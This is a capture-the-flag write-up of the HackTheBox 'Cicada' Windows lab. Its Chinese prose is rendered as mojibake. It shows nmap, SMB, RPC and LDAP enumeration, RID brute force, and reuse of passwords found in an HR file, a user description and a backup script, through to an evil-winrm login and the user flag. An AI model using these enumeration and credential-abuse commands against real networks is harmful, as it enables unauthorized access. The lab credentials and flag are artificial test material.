# Cicada

- IP: `10.10.11.35`
- tags: `Easy`, `Windows`
- status: `userflag gained`

## Enumeration

é¦–å…ˆï¼Œä½¿ç”¨ `ping` æª¢æŸ¥é€£ç·šæ˜¯å¦æ­£å¸¸
```sh
ping 10.10.11.35
```

![](./img/ping.png)

### Nmap

ä½¿ç”¨ nmap é€²è¡Œæƒæ
```sh
sudo nmap -v -sV -sS 10.10.11.35
```

![](./img/nmap.png)

å¯ä»¥ç™¼ç¾åˆ°æœ‰é–‹äº†ä»¥ä¸‹æœå‹™ï¼Œçœ‹èµ·ä¾†æ˜¯ä¸€å€‹ AD ç’°å¢ƒ

```
DNS
Kerberos
Windows RPC
SMB
Active Directory LDAP
```

æ­¤å¤–æˆ‘å€‘å¯çŸ¥é“ AD çš„ domain name ç‚º `cicada.htb`

### LDAP

é¦–å…ˆï¼Œå› ç‚ºæœ‰ LDAP çš„é—œä¿‚ï¼Œå› æ­¤æˆ‘å˜—è©¦ä½¿ç”¨ `ldapsearch` åšåˆ—èˆ‰ï¼Œä½†ç™¼ç¾æœ‰ `Operations Error` çš„å•é¡Œï¼Œç„¡æ³•åˆ—èˆ‰æˆåŠŸ

```sh
ldapsearch -x -H ldap://10.10.11.35 -b 'dc=cicada,dc=htb'
```

![](./img/ldapsearch.png)

### DNS

æ­¤å¤–ç”±æ–¼æœ‰ DNS æœå‹™ï¼Œå› æ­¤æˆ‘é¦–å…ˆå˜—è©¦ zone transfer ä¾†å·è¨˜éŒ„ï¼Œä½†ç™¼ç¾ä¼¼ä¹æ²’é–‹

```sh
dig axfr @10.10.11.35 
```

![](./img/dns_axfr.png)

è€Œç”±æ–¼å‰é¢ nmap æˆ‘å€‘çŸ¥é“ domain name ç‚º `cicada.htb`ï¼Œå› æ­¤æˆ‘é€™é‚Šä¹Ÿå˜—è©¦æŸ¥æ‰¾ç›¸é—œç´€éŒ„ï¼Œç™¼ç¾é™¤äº† DC ä¹‹å¤–é‚„æœ‰å¦ä¸€å€‹ `hostmaster.cicada.htb` çš„ DNS ç´€éŒ„ (ä½†ä¼¼ä¹æ²’ç”¨å°±æ˜¯äº†)

```sh
dig any @10.10.11.35 cicada.htb
```

![](./img/dns_any.png)

### SMB

åœ¨æ­¤åŸºæœ¬ä¸Šå‰äºŒè€…æ‰¾ä¸åˆ°æœ‰ç”¨çš„æ±è¥¿äº†ï¼Œè€Œç”±æ–¼æˆ‘è¼ƒå°‘æ‰“ Windows çš„æ©Ÿå™¨ï¼Œå› æ­¤åœ¨å˜—è©¦çœ‹å…¶ä»– AD pentesting æ‰“æ³• (e.g. [é€™ç¯‡](https://yu-shiuan2017.medium.com/htb-forest%E9%9D%B6%E6%A9%9F-write-up-6e27b252ef11)) çš„æ™‚å€™ï¼Œç™¼ç¾é‚„å¯ä»¥å¾ SMB ä¸‹æ‰‹

æˆ‘é¦–å…ˆå˜—è©¦åˆ—èˆ‰ SMB shareï¼Œç™¼ç¾ç¢ºå¯¦æœ‰ä¸€äº›ç›®éŒ„å¯ä»¥çµ¦ Anonymous å­˜å–

```sh
smbclient -N -L \\10.10.11.35
```

![](./img/smb_list.png)

é¦–å…ˆæˆ‘å…ˆæŸ¥çœ‹ `DEV` çš„ shareï¼Œé›–ç„¶èƒ½æˆåŠŸåŒ¿åç™»å…¥ï¼Œä½†æ˜¯æ²’æœ‰æ¬Šé™è®€å–ç›®éŒ„

```sh
smbclient -N \\\\10.10.11.35\\DEV
```

![](./img/smb_dev_anonymous.png)

ä¸é `HR` çš„ share å€’æ˜¯å¯ä»¥ç™»å…¥åŠç›®éŒ„åˆ—èˆ‰ï¼Œè£¡é¢å¯ä»¥ç™¼ç¾ä¸€å€‹ `Notice from HR.txt` æª”æ¡ˆ

```sh
smbclient -N \\\\10.10.11.35\\HR 
```

![](./img/smb_hr_anonymous.png)

æª”æ¡ˆå…§å®¹å¦‚ä¸‹

```
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶ä¸­æåˆ°äº†ä¸€å€‹é è¨­å¯†ç¢¼ `Cicada$M6Corpb*@Lp#nZp!8`ï¼Œè€Œæˆ‘å€‘å¯ä»¥å˜—è©¦æ‰¾å‡ºæœ‰é‚£äº›ä½¿ç”¨è€…å¯èƒ½æœƒå¿˜è¨˜æ›´æ”¹å¯†ç¢¼

### Enumerate Users

é€™é‚Šæˆ‘æœ‰å…ˆå˜—è©¦å‡è¨­ä½¿ç”¨è€…å°±å«åš `HR`ï¼Œå˜—è©¦ä½¿ç”¨ `impacket` çš„ `GetTGT` åš pass the keyï¼Œä½†æ˜¯ç™¼ç¾ client not found çš„å•é¡Œï¼Œä»£è¡¨ä½¿ç”¨è€…ä¸æ˜¯ `HR` é€™éº¼å–®ç´”

```sh
impacket-getTGT 'cicada.htb/HR:Cicada$M6Corpb*@Lp#nZp!8'
```

![](./img/gettgt_hr.png)

é€™é‚Šæˆ‘é¦–å…ˆå˜—è©¦ä½¿ç”¨ `crackmapexec` åš SMB åˆ—èˆ‰ï¼Œç™¼ç¾éœ€è¦æ¬Šé™

```sh
crackmapexec smb 10.10.11.35 --users
```

![](./img/crackmapexec_smb_anonymous.png)

æ¥è€…æˆ‘å˜—è©¦ä½¿ç”¨ `rpcclient` åš `enumdomusers` åˆ—èˆ‰ä½¿ç”¨è€…ï¼Œç™¼ç¾ä¸€æ¨£éœ€è¦æ¬Šé™

```sh
rpcclient -U '' -N 10.10.11.35
```

![](./img/rpcclient_enum_anonumous.png)

æˆ‘ä¹Ÿå˜—è©¦ä½¿ç”¨ `crackmapexec` åš LDAP åˆ—èˆ‰ï¼Œç™¼ç¾å ±éŒ¯ï¼Œå¯èƒ½æ˜¯ä¸€æ¨£éœ€è¦æ¬Šé™çš„ç·£æ•…

```sh
crackmapexec ldap cicada.htb --users
```

![](./img/crackmapexec_ldap_anonymous.png)


è€Œåœ¨ç¿»æ‰¾ç›¸é—œè³‡æ–™æ™‚ï¼Œç™¼ç¾[è¨è«–å€](https://forum.hackthebox.com/t/official-cicada-discussion/326359/22)æœ‰äººæå‡ºå¯ä»¥ç”¨ `netexec` åš rid brute forceï¼Œå› æ­¤æˆ‘ä¹Ÿå˜—è©¦è©²æ–¹æ³•ï¼Œç™¼ç¾é€™æ¨£å°±èƒ½æ­£å¸¸åˆ—èˆ‰ä½¿ç”¨è€…äº† (é€™é‚Šä½¿ç”¨çš„ `guest`/`` ä¹Ÿæ˜¯è¨è«–å€æœ‰äººæ‰¾å‡ºçš„)

```sh
nxc smb 10.10.11.35 -u guest -p '' --rid-brute
```

![](./img/nxc_rid_brute.png)

æ•´ç†å‡ºä»¥ä¸‹å¹¾å€‹ä½¿ç”¨è€…

```
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1601: CICADA\emily.oscars (SidTypeUser)
```

åŸºæœ¬ä¸Šæ¯”è¼ƒæœ‰ç”¨çš„å°±æ˜¯ä¸‹é¢é€™ 5 å€‹ä¸€èˆ¬ä½¿ç”¨è€…ï¼Œå› æ­¤ä¸€ä¸€å˜—è©¦ä½¿ç”¨ `GetTGT` ä¾†æ‰¾å‡ºå°æ‡‰çš„ä½¿ç”¨è€…

è€Œå¾ä»¥ä¸‹çµæœå¯ä»¥çœ‹åˆ°ï¼Œ`michael.wrightson` å‡ºç¾ clock skew çš„å•é¡Œè€Œå…¶ä»–çš„æ˜¯ pre-authentication çš„éŒ¯èª¤ï¼Œä»£è¡¨ `michael.wrightson` å¾ˆå¯èƒ½å·²ç¶“é€šé pre-authentication ä½†é‡åˆ°æ™‚é–“åŒæ­¥å•é¡Œè€Œç„¡æ³•ç”¢ç”Ÿ TGTï¼Œå› æ­¤å¯ä»¥å‡å®šè©²å¯†ç¢¼æ‡‰è©²å°æ‡‰çš„ä½¿ç”¨è€…æ˜¯ `michael.wrightson`

![](./img/gettgt_brute.png)

è€Œç”±æ–¼æˆ‘æ‡¶å¾—ä¿®æ™‚é–“çš„å•é¡Œï¼Œå› æ­¤æˆ‘æ”¹æˆä½¿ç”¨ `evil-winrm` å·¥å…·é€²è¡Œç™»å…¥ï¼Œä½†ç™¼ç¾é€™æ™‚é‚„æ˜¯ç„¡æ³•æˆåŠŸç™»å…¥

```sh
evil-winrm -i cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![](./img/winrm_michael.png)

è€Œä½¿ç”¨ `smbclient`ï¼Œç™¼ç¾å¯ä»¥æ­£å¸¸ç™»å…¥ï¼Œå¯†ç¢¼æ‡‰è©²æ˜¯æ²’å•é¡ŒğŸ¤”

```sh
smbclient \\\\10.10.11.35\\HR --user 'michael.wrightson'
```

![](./img/smb_michael.png)

### Enumerate Others

è€Œå†çœ‹äº†ä¸€ä¸‹[è¨è«–å€](https://forum.hackthebox.com/t/official-cicada-discussion/326359/41)ï¼Œç™¼ç¾æœ‰äººæåˆ°å¯ä»¥ç¹¼çºŒæ‰¾ `winrm`, `ldap` ä¹‹é¡çš„ï¼Œè€Œé€™æ™‚æˆ‘ä¹Ÿæƒ³èµ·ä¾†å…ˆå‰å˜—è©¦åˆ—èˆ‰ LDAP å’Œ RPC æ™‚é‡åˆ°çš„æ¬Šé™å•é¡Œï¼Œå› æ­¤è¿”å›å»å˜—è©¦ä½¿ç”¨ `michael` çš„å¸³è™Ÿç™»å…¥

æˆ‘å˜—è©¦ä½¿ç”¨ `rpcclient` ç”¨ `michael` èº«åˆ†ç™»å…¥ï¼Œç™¼ç¾ç¢ºå¯¦å¯ä»¥æ­£å¸¸ç™»å…¥ä¸”åˆ—èˆ‰ä½¿ç”¨è€…ï¼Œæ­¤å¤–æˆ‘ä¹Ÿå˜—è©¦æŸ¥çœ‹ `michael` çš„ä½¿ç”¨è€…è³‡è¨Šï¼Œä½†æ²’çœ‹åˆ°æœ‰ç‰¹åˆ¥çš„åœ°æ–¹

```sh
rpcclient -U 'michael.wrightson' --password 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35
```

![](./img/rpcclient_michael.png)

è€Œå¾Œåœ¨ç¶²è·¯ä¸Šç¹¼çºŒæœå°‹æ™‚ï¼Œç™¼ç¾äº†ä¸€å€‹ç¥ç¥•çš„[è§£é¡Œå½±ç‰‡](https://www.youtube.com/watch?v=w3yR7bYaHg8)ï¼Œç™¼ç¾å…¶ä»–ä½¿ç”¨è€…çš„è³‡æ–™ä¸­æœ‰æ±è¥¿ï¼Œå¯ä»¥ç™¼ç¾ `david.orelious` çš„ä½¿ç”¨è€…èªªæ˜ä¸­ç›´æ¥å¯«äº†ä»–çš„å¯†ç¢¼ `aRt$Lp#7t*VQ!3`

```sh
queryuser 0x454
```

![](./img/rpcclient_david.png)

ç•¶ç„¶ï¼Œç›´æ¥ç™»å…¥ä¸€æ¨£æ˜¯ç„¡æ³•æˆåŠŸ

![](./img/evilwinrm_david.png)

å› æ­¤ä¾ç…§å‰›æ‰çš„é‚è¼¯ï¼Œæˆ‘å˜—è©¦ä½¿ç”¨ `david.orelious` èº«åˆ†ç™»å…¥ SMBï¼Œç™¼ç¾æ­¤æ™‚å¯ä»¥å­˜å– `DEV`  share çš„å…§å®¹ï¼Œè£¡é¢æœ‰ä¸€å€‹ `Backup_script.ps1` æª”æ¡ˆ

```sh
smbclient \\\\10.10.11.35\\DEV --user 'david.orelious'
```

![](./img/smb_david.png)

æª”æ¡ˆå…§å®¹å¦‚ä¸‹

```powershell

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

å¯ä»¥çœ‹åˆ°è£¡é¢æ˜¯ `emily.oscars` å’Œä»–çš„å¯†ç¢¼ `Q!3@Lp#M6b*7t*Vt`ï¼Œå› æ­¤æˆ‘å€‘å¯ä»¥å˜—è©¦ä½¿ç”¨ `emily.oscars` çš„å¸³è™Ÿç™»å…¥ï¼Œç™¼ç¾æ­¤æ™‚å¯ä»¥æ­£å¸¸ç”¨ `evil-winrm` ç™»å…¥æˆåŠŸ

```sh
evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

![](./img/evilwinrm_emily.png)

userflag åœ¨ `C:\Users\emily.oscars.CICADA\Desktop\user.txt` ä¸‹

![](./img/userflag.png)

```
48b54043921218f16e4f555fce5c5b19
```

## Privilege Escalation

TODO